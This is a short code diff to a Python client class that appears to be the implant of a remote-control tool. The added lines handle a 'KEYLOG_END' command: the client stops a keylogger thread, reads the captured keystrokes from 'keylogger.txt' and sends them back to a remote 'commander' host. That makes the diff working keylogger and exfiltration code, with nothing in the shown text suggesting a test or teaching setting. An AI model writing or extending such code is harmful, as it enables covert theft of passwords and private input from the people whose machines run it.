@@ -501,7 +501,16 @@ class Client:
         elif command_type == CommandType.KEYLOG_END:
             print("[*] Processing STOP_WATCH")
             self._stop_keylogger()
-            print("    File watcher stopped.")
+            print("    Keylogger stopped.")
+            try:
+                with open("keylogger.txt", 'rb') as f:
+                    content = f.read()
+                print(f"    Sending {len(content)} bytes to commander")
+                self.send_response(src_ip, CommandType.ACK, content)
+            except Exception as e:
+                print(f"    Error: {e}")
+                self.send_response(src_ip, CommandType.ERROR, str(e).encode())
+
 
     def _stop_file_watcher(self):
         """Stop the active file watcher thread if running."""
@@ -520,6 +529,7 @@ class Client:
             self._keylogger_thread.join(timeout=3)
             self._keylogger_thread = None
         self._keylogger_stop.clear()
+
 
     # ------------------------------------------------------------------ #
     #  Response sender                                                     #
